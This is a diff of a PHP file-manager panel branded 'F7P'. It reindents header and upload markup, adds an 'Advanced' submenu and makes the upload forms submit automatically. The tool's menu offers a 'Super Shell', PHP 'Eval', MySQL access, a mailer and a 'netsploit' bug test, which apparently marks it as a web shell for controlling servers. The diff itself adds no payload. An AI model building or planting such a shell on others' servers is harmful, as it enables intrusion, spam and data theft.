@@ -697,28 +697,45 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
 <body>
 
     <div id="header">
-        <div class="brand" onclick="goToRoot();" title="Go to root">F<span>7</span>P</div>
-        <div class="breadcrumb" id="breadcrumb">
-            <?php echo $breadcrumb_full; ?>
-        </div>
-        <div  class="header-actions">
-            <button class="btn-icon" onclick="toggleCommand();" title="Toggle Command"><img width=24px src=f7p-assets/terminalx.png></button>
-            <div class="dropdown">
-                <button class="dropdown-toggle" onclick="toggleDropdown();" title="More">⋮</button>
-                <div class="dropdown-menu" id="dropdown-menu">
-                    <a href="?<?php echo "y=".$pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/explorer.png> Explorer</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=github" data-no-ajax="true"><img width=24px src=f7p-assets/github.png> GitHub API</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=shell" data-no-ajax="true"><img width=24px src=f7p-assets/terminalx.png> Super Shell</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=php" data-no-ajax="true"><img width=24px src=f7p-assets/eval.png> Eval</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql" data-no-ajax="true"><img width=24px src=f7p-assets/mysql.png> MySQL</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo" data-no-ajax="true"><img width=24px src=f7p-assets/php.png> PHPInfo</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit" data-no-ajax="true"><img width=24px src=f7p-assets/bug.png> Bug test</a>
-                    <a href="?<?php echo "y=".$pwd; ?>&amp;x=mail" data-no-ajax="true"><img width=24px src=f7p-assets/mailer.png> Mail</a>
-                    <a href="?logout=1" data-no-ajax="true" style="border-top:2px solid #eee;margin-top:4px;color:#cc3333;"><img width=24px src=f7p-assets/logout.png> Logout</a>
-                </div>
+    <div class="brand" onclick="goToRoot();" title="Go to root">F<span>7</span>P</div>
+    <div class="breadcrumb" id="breadcrumb">
+        <?php echo $breadcrumb_full; ?>
+    </div>
+    <div class="header-actions">
+        <button class="btn-icon" onclick="toggleCommand();" title="Toggle Command"><img width=24px src=f7p-assets/terminalx.png></button>
+        <div class="dropdown">
+            <button class="dropdown-toggle" onclick="toggleDropdown();" title="More">⋮</button>
+            <div class="dropdown-menu" id="dropdown-menu">
+                <a href="?<?php echo "y=".$pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/explorer.png> Explorer</a>
+                <a href="?<?php echo "y=".$pwd; ?>&amp;x=github" data-no-ajax="true"><img width=24px src=f7p-assets/github.png> GitHub API</a>
+                <a href="?<?php echo "y=".$pwd; ?>&amp;x=shell" data-no-ajax="true"><img width=24px src=f7p-assets/terminalx.png> Super Shell</a>
+                <a href="?<?php echo "y=".$pwd; ?>&amp;x=php" data-no-ajax="true"><img width=24px src=f7p-assets/eval.png> Eval</a>
+                <a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql" data-no-ajax="true"><img width=24px src=f7p-assets/mysql.png> MySQL</a>
+                <a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo" data-no-ajax="true"><img width=24px src=f7p-assets/php.png> PHPInfo</a>
+                <a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit" data-no-ajax="true"><img width=24px src=f7p-assets/bug.png> Bug test</a>
+                <a href="?<?php echo "y=".$pwd; ?>&amp;x=mail" data-no-ajax="true"><img width=24px src=f7p-assets/mailer.png> Mail</a>
+                
+<div class="sub-wrap">
+    <a href="javascript:void(0);" class="sub-trigger" 
+       onclick="event.preventDefault();event.stopPropagation();var s=this.parentElement.querySelector('.sub-drop');if(s){document.querySelectorAll('.sub-drop.open').forEach(function(x){if(x!==s)x.classList.remove('open')});s.classList.toggle('open')}" 
+       data-no-ajax="true">
+        <img width=24px src=f7p-assets/advanced.png> Advanced
+    </a>
+    <div class="sub-drop left">
+        <a href="javascript:void(0);" onclick="showVersionHistory();" data-no-ajax="true">
+            <img width=20px src=f7p-assets/version.png> Saved Version
+        </a>
+        <a href="javascript:void(0);" onclick="goToGitHubAtPoint();" data-no-ajax="true">
+            <img width=20px src=f7p-assets/github.png> Go to Ur Github at this
+        </a>
+    </div>
+</div>
+                
+                <a href="?logout=1" data-no-ajax="true" style="border-top:2px solid #eee;margin-top:4px;color:#cc3333;"><img width=24px src=f7p-assets/logout.png> Logout</a>
             </div>
         </div>
     </div>
+</div>
 
     <div id="content">
 
@@ -1164,11 +1181,11 @@ elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
         }
         
         var saveHandler = function(e){
-            e.preventDefault();
-            var content=editor.value;
-            if(!content&&content!==''){alert('Content is empty');return;}
-            saveBtn.disabled=true;saveBtn.value='Saving...';saveBtn.style.background = '#CECECE';
-            saveFileViaIndexedDB(filePath,content).then(function(resp){
+    e.preventDefault();
+    var content=editor.value;
+    if(!content&&content!==''){alert('Content is empty');return;}
+    saveBtn.disabled=true;saveBtn.value='Saving...';saveBtn.style.background = '#CECECE';
+    saveFileViaIndexedDB(filePath,content).then(function(resp){
                 var now=new Date();
                 var h=now.getHours();var m=String(now.getMinutes()).padStart(2,'0');var s=String(now.getSeconds()).padStart(2,'0');
                 var ampm=h>=12?'PM':'AM';h=h%12||12;
@@ -1223,6 +1240,7 @@ elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
     </script>
     
     <script src="f7p-assets/_script_editpage.js"></script>
+<script src="f7p-assets/_version.js"></script>
     <script src="f7p-assets/_script.js"></script>
 <?php }
 elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
@@ -1348,40 +1366,39 @@ elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
         </div>
         <input type="hidden" name="path" value="<?php echo $pwd; ?>">
     </form>
-    
-    
-    <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form">
-        <?php if ($msg_file): ?>
-            <div class="upload-msg <?php echo strpos($msg_file, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
-                <?php echo $msg_file; ?>
-            </div>
-        <?php endif; ?>
-        
-        <div class="upload-row">
-            <input type="file" name="file[]" multiple id="localFileInput" class="upload-file-input">
-            <input class="upload-btn-local" type="button" value="📁 Upload from Local" onclick="document.getElementById('localFileInput').click();">
-            <span id="localFileCount" class="upload-file-count upload-file-count-local"></span>
-            <input class="upload-btn-upload" type="submit" name="uploadcomp" value="Upload">
+
+<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form" id="uploadForm">
+    <?php if ($msg_file): ?>
+        <div class="upload-msg <?php echo strpos($msg_file, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
+            <?php echo $msg_file; ?>
         </div>
-        <input type="hidden" name="path" value="<?php echo $pwd; ?>">
-    </form>
+    <?php endif; ?>
     
-    
-    <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form upload-form-zip">
-        <?php if ($msg_zip): ?>
-            <div class="upload-msg <?php echo strpos($msg_zip, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
-                <?php echo $msg_zip; ?>
-            </div>
-        <?php endif; ?>
-        
-        <div class="upload-row">
-            <input type="file" name="zip_file" accept=".zip" id="zipFileInput" class="upload-file-input">
-            <input class="upload-btn-zip" type="button" value="📦 Upload + Unzip" onclick="document.getElementById('zipFileInput').click();">
-            <span id="zipFileCount" class="upload-file-count upload-file-count-zip"></span>
-            <input class="upload-btn-extract" type="submit" name="uploadzip" value="Extract">
+    <div class="upload-row">
+        <input type="file" name="file[]" multiple id="localFileInput" class="upload-file-input" style="display:none;" onchange="this.form.submit();">
+        <input class="upload-btn-local" type="button" value="📁 Upload from Local" onclick="document.getElementById('localFileInput').click();">
+        <span id="localFileCount" class="upload-file-count upload-file-count-local"></span>
+    </div>
+    <input type="hidden" name="path" value="<?php echo $pwd; ?>">
+    <input type="hidden" name="uploadcomp" value="1">
+</form>
+
+
+<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form upload-form-zip" id="zipForm">
+    <?php if ($msg_zip): ?>
+        <div class="upload-msg <?php echo strpos($msg_zip, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
+            <?php echo $msg_zip; ?>
         </div>
-        <input type="hidden" name="path" value="<?php echo $pwd; ?>">
-    </form>
+    <?php endif; ?>
+    
+    <div class="upload-row">
+        <input type="file" name="zip_file" accept=".zip" id="zipFileInput" class="upload-file-input" style="display:none;" onchange="this.form.submit();">
+        <input class="upload-btn-zip" type="button" value="📦 Upload + Unzip" onclick="document.getElementById('zipFileInput').click();">
+        <span id="zipFileCount" class="upload-file-count upload-file-count-zip"></span>
+    </div>
+    <input type="hidden" name="path" value="<?php echo $pwd; ?>">
+    <input type="hidden" name="uploadzip" value="1">
+</form>
     
 </div>
     <script>
